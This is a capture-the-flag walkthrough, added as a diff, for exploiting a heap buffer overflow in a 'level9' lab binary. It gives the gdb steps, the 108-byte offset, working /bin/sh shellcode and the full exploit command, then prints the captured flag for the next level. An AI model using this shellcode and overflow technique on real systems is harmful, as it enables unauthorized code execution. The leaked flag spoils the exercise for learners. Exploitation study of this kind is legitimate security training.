@@ -1,0 +1,37 @@
+HOW TO FIND THE FLAG:
+
+First let's analyse the binary file level9
+
+gdb level9 -> disas main
+
+We see that if the number of arg is lower than 1 then exit is called.
+
+Then we create two instances of the class N with argument 5 for the first instance and argument 6 for the second instance.
+
+Then call to setAnnotation which memcpy the src (argv[1]) into the buf of the instance of class N.
+
+The goal here is to execute a shellcode. In order to do this we need to find the offset at which the buffer overflow occurs.
+
+With the wiremask pattern generator -> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+We go to gdb and do r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+We see that the program segfault at 0x08048682 in main.
+
+i r -> info register -> We see the value of eax 0x41366441 => (A6DA) -> with wiremask we can see the offset is 108
+
+In order to execute the shell code we will construct the payload with the form of ADRESS OF SHELLCODE + SHELL CODE + ANY CHAR + RETURN ADRESS OF SETANNOTATION/MEMCPY
+
+Let's find the return adress of memcpy/setannotation -> We put a breakpoint just after setAnnotation at *main+136
+
+r $(python -c 'print "A" * 108') -> i r -> we see that the adress of eax is 0x804a00c
+
+x/wx $esp => 0x0804a008 => x/50x 0x0804a008 -> we that the character 41 appears from the adress 0x0804a010 -> adress of the shellcode
+
+So the payload is of size 108 - shellcode of size 55 - adress of size 4  = 49 char to fill the payload
+
+Our shellcode -> '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + 49 * "A" + "\x0c\xa0\x04\x08"')
+
+-> cat /home/user/bonus0/.pass -> we get the flag f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
